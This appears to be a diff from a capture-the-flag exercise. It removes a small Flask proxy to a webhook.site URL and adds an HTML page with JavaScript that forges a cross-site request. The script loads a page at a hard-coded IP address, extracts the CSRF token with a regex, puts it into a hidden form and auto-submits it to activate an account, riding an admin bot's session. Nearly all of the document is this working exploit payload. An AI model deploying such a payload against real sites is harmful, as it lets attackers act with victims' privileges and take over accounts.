@@ -1,17 +1,16 @@
-from flask import Flask, Response
-import requests
-import os
+<form name="csrf" action="http://34.134.162.213:17001/" method="post" enctype="multipart/form-data">
+    <input type="hidden" name="username" value="exp" />  <!-- Activate account, modify according to actual needs -->
+    <input type="hidden" name="status" value="on" />  <!-- Activation action -->
+    <input type="hidden" name="csrf_token" id="csrfTokenField" value=""></form>
 
-app = Flask(__name__)
-
-WEBHOOK_URL = "https://webhook.site/dbe4edad-666e-4b5a-badf-424f4b3a4e09"
-
-@app.route("/")
-def index():
-    resp = requests.get(WEBHOOK_URL)
-    return Response(resp.content, status=resp.status_code, content_type=resp.headers['Content-Type'])
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port)
-
+<script>
+    // Use robot-admin's identity to get robot-admin's token to bypass CSRF validation
+    var request = new XMLHttpRequest();
+    request.open("GET", decodeURIComponent("http://34.134.162.213:17001/"), false);
+    request.send(null);
+    var response = request.responseText;
+    var groups = response.match("csrf_token\" value=\"(.*?)\"");
+    var token = groups[1];
+    document.getElementById("csrfTokenField").value = token;  // Replace with robot-admin's token
+    document.csrf.submit();
+</script>
